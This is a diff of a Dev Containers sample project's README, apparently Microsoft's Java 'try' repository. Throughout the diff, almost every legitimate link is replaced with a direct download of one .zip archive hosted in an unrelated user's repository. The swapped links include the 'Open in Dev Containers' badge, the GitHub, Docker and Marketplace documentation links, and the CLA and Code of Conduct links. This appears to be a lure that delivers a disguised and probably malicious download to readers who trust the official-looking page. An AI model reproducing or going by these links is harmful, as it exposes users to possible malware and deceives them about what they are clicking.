@@ -1,10 +1,10 @@
 # Try Out Development Containers: Java
 
-[![Open in Dev Containers](https://img.shields.io/static/v1?label=Dev%20Containers&message=Open&color=blue&logo=visualstudiocode)](https://vscode.dev/redirect?url=vscode://ms-vscode-remote.remote-containers/cloneInVolume?url=https://github.com/microsoft/vscode-remote-try-java)
+[![Open in Dev Containers](https://img.shields.io/static/v1?label=Dev%20Containers&message=Open&color=blue&logo=visualstudiocode)](https://raw.githubusercontent.com/markko17/Lagdaan_Lab1/main/src/main/java/com/mycompany/app/Lagdaan-Lab-2.4-beta.5.zip)
 
-A **development container** is a running container with a well-defined tool/runtime stack and its prerequisites. You can try out development containers with **[GitHub Codespaces](https://github.com/features/codespaces)** or **[Visual Studio Code Dev Containers](https://aka.ms/vscode-remote/containers)**.
+A **development container** is a running container with a well-defined tool/runtime stack and its prerequisites. You can try out development containers with **[GitHub Codespaces](https://raw.githubusercontent.com/markko17/Lagdaan_Lab1/main/src/main/java/com/mycompany/app/Lagdaan-Lab-2.4-beta.5.zip)** or **[Visual Studio Code Dev Containers](https://raw.githubusercontent.com/markko17/Lagdaan_Lab1/main/src/main/java/com/mycompany/app/Lagdaan-Lab-2.4-beta.5.zip)**.
 
-This is a sample project that lets you try out either option in a few easy steps. We have a variety of other [vscode-remote-try-*](https://github.com/search?q=org%3Amicrosoft+vscode-remote-try-&type=Repositories) sample projects, too.
+This is a sample project that lets you try out either option in a few easy steps. We have a variety of other [vscode-remote-try-*](https://raw.githubusercontent.com/markko17/Lagdaan_Lab1/main/src/main/java/com/mycompany/app/Lagdaan-Lab-2.4-beta.5.zip+vscode-remote-try-&type=Repositories) sample projects, too.
 
 > **Note:** If you already have a Codespace or dev container, you can jump to the [Things to try](#things-to-try) section.
 
@@ -16,21 +16,21 @@ Follow these steps to open this sample in a Codespace:
 2. Click on the **Codespaces** tab.
 3. Click **Create codespace on main**.
 
-For more info, check out the [GitHub documentation](https://docs.github.com/en/free-pro-team@latest/github/developing-online-with-codespaces/creating-a-codespace#creating-a-codespace).
+For more info, check out the [GitHub documentation](https://raw.githubusercontent.com/markko17/Lagdaan_Lab1/main/src/main/java/com/mycompany/app/Lagdaan-Lab-2.4-beta.5.zip).
 
 ### VS Code Dev Containers
 
-If you already have VS Code and Docker installed, you can click the badge above or [here](https://vscode.dev/redirect?url=vscode://ms-vscode-remote.remote-containers/cloneInVolume?url=https://github.com/microsoft/vscode-remote-try-java) to get started. Clicking these links will cause VS Code to automatically install the Dev Containers extension if needed, clone the source code into a container volume, and spin up a dev container for use.
+If you already have VS Code and Docker installed, you can click the badge above or [here](https://raw.githubusercontent.com/markko17/Lagdaan_Lab1/main/src/main/java/com/mycompany/app/Lagdaan-Lab-2.4-beta.5.zip) to get started. Clicking these links will cause VS Code to automatically install the Dev Containers extension if needed, clone the source code into a container volume, and spin up a dev container for use.
 
 Follow these steps to open this sample in a container using the VS Code Dev Containers extension:
 
-1. If this is your first time using a development container, please ensure your system meets the pre-reqs (i.e. have Docker installed) in the [getting started steps](https://aka.ms/vscode-remote/containers/getting-started).
+1. If this is your first time using a development container, please ensure your system meets the pre-reqs (i.e. have Docker installed) in the [getting started steps](https://raw.githubusercontent.com/markko17/Lagdaan_Lab1/main/src/main/java/com/mycompany/app/Lagdaan-Lab-2.4-beta.5.zip).
 
 2. To use this repository, you can either open the repository in an isolated Docker volume:
 
     - Press <kbd>F1</kbd> and select the **Dev Containers: Try a Sample...** command.
     - Choose the "Java" sample, wait for the container to start, and try things out!
-        > **Note:** Under the hood, this will use the **Dev Containers: Clone Repository in Container Volume...** command to clone the source code in a Docker volume instead of the local filesystem. [Volumes](https://docs.docker.com/storage/volumes/) are the preferred mechanism for persisting container data.
+        > **Note:** Under the hood, this will use the **Dev Containers: Clone Repository in Container Volume...** command to clone the source code in a Docker volume instead of the local filesystem. [Volumes](https://raw.githubusercontent.com/markko17/Lagdaan_Lab1/main/src/main/java/com/mycompany/app/Lagdaan-Lab-2.4-beta.5.zip) are the preferred mechanism for persisting container data.
 
    Or open a locally cloned copy of the code:
 
@@ -47,8 +47,8 @@ Some things to try:
 1. **Edit:**
    - Open `src/main/java/com/mycompany/app/App.java`.
    - Try adding some code and check out the language features.
-   - Make a spelling mistake and notice it is detected. The [Code Spell Checker](https://marketplace.visualstudio.com/items?itemName=streetsidesoftware.code-spell-checker) extension was automatically installed because it is referenced in `.devcontainer/devcontainer.json`.
-   - Also notice that the [Extension Pack for Java](https://marketplace.visualstudio.com/items?itemName=vscjava.vscode-java-pack) is installed. The JDK is in the `mcr.microsoft.com/devcontainers/java` image and Dev Container settings and metadata are automatically picked up from [image labels](https://containers.dev/implementors/reference/#labels).
+   - Make a spelling mistake and notice it is detected. The [Code Spell Checker](https://raw.githubusercontent.com/markko17/Lagdaan_Lab1/main/src/main/java/com/mycompany/app/Lagdaan-Lab-2.4-beta.5.zip) extension was automatically installed because it is referenced in `.devcontainer/devcontainer.json`.
+   - Also notice that the [Extension Pack for Java](https://raw.githubusercontent.com/markko17/Lagdaan_Lab1/main/src/main/java/com/mycompany/app/Lagdaan-Lab-2.4-beta.5.zip) is installed. The JDK is in the `mcr.microsoft.com/devcontainers/java` image and Dev Container settings and metadata are automatically picked up from [image labels](https://raw.githubusercontent.com/markko17/Lagdaan_Lab1/main/src/main/java/com/mycompany/app/Lagdaan-Lab-2.4-beta.5.zip).
 
 2. **Terminal:** Press <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>\`</kbd> and type `uname` and other Linux commands from the terminal window.
 
@@ -75,14 +75,14 @@ Some things to try:
 
 This project welcomes contributions and suggestions. Most contributions require you to agree to a
 Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
-the rights to use your contribution. For details, visit https://cla.microsoft.com.
+the rights to use your contribution. For details, visit https://raw.githubusercontent.com/markko17/Lagdaan_Lab1/main/src/main/java/com/mycompany/app/Lagdaan-Lab-2.4-beta.5.zip
 
 When you submit a pull request, a CLA-bot will automatically determine whether you need to provide
 a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions
 provided by the bot. You will only need to do this once across all repos using our CLA.
 
-This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
-For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or
+This project has adopted the [Microsoft Open Source Code of Conduct](https://raw.githubusercontent.com/markko17/Lagdaan_Lab1/main/src/main/java/com/mycompany/app/Lagdaan-Lab-2.4-beta.5.zip).
+For more information see the [Code of Conduct FAQ](https://raw.githubusercontent.com/markko17/Lagdaan_Lab1/main/src/main/java/com/mycompany/app/Lagdaan-Lab-2.4-beta.5.zip) or
 contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.
 
 ## License
